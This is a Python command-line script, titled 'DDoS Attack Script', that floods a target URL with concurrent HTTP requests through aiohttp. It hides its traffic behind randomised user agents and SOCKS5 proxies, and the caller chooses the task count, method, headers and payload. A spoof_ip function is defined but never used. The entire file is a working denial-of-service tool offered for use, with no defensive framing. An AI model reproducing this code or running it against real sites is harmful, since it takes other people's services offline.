import asyncio
import aiohttp
import random
import logging
import time
import argparse
import json
import struct
import socket
from aiohttp import ClientSession, ClientTimeout, ClientError
from aiohttp_socks import ProxyConnector

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# List of user agents to randomize requests
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
]

def spoof_ip():
    ip = socket.inet_ntoa(struct.pack(">I", random.randint(1, 0xFFFFFFFF)))
    return ip

async def ddos_attack(url, rate_limit, method, headers, data, proxy):
    headers['User-Agent'] = random.choice(user_agents)
    timeout = ClientTimeout(total=10)

    connector = None
    if proxy and proxy.startswith('socks5://'):
        connector = ProxyConnector.from_url(proxy)

    async with ClientSession(connector=connector, timeout=timeout) as session:
        try:
            async with session.request(method, url, headers=headers, data=data) as response:
                handle_response(response, url)
        except ClientError as e:
            logging.error(f"Error: {e}")
        finally:
            await asyncio.sleep(random.uniform(0, rate_limit))

def handle_response(response, url):
    if response.status == 200:
        logging.info(f"Request to {url} returned 200 OK")
    elif response.status == 400:
        logging.info(f"Request to {url} returned 400 Bad Request")
    else:
        logging.info(f"Request to {url} returned {response.status}")

async def start_attack(url, num_tasks, rate_limit, method, headers, data, proxies):
    tasks = []
    for _ in range(num_tasks):
        proxy = random.choice(proxies) if proxies else None
        task = asyncio.create_task(ddos_attack(url, rate_limit, method, headers, data, proxy))
        tasks.append(task)
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Script")
    parser.add_argument("url", help="Target URL for the DDoS attack")

    # ဒီနေရာမှာ --num_tasks အဖြစ် ပြောင်းလဲလိုက်ပါတယ် (default value ပါ ထည့်ပေးထားပါတယ်)
    parser.add_argument("--num_tasks", type=int, default=1, help="Number of tasks to use for the attack (default: 1)")

    parser.add_argument("--rate_limit", type=float, default=1.0, help="Rate limit in seconds between requests (default: 1.0)")
    parser.add_argument("--method", type=str, default="GET", help="HTTP method to use (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH) (default: GET)")
    parser.add_argument("--headers", type=str, help="Custom headers in JSON format")
    parser.add_argument("--data", type=str, help="Data to send with POST, PUT, PATCH requests in JSON format")
    parser.add_argument("--proxies", type=str, help="List of proxies to use in JSON format")

    args = parser.parse_args()

    headers = {}
    if args.headers:
        headers = json.loads(args.headers)

    data = None
    if args.data:
        data = json.loads(args.data)

    proxies_list = []
    if args.proxies:
        proxies_list = json.loads(args.proxies)

    asyncio.run(start_attack(args.url, args.num_tasks, args.rate_limit, args.method, headers, data, proxies_list))
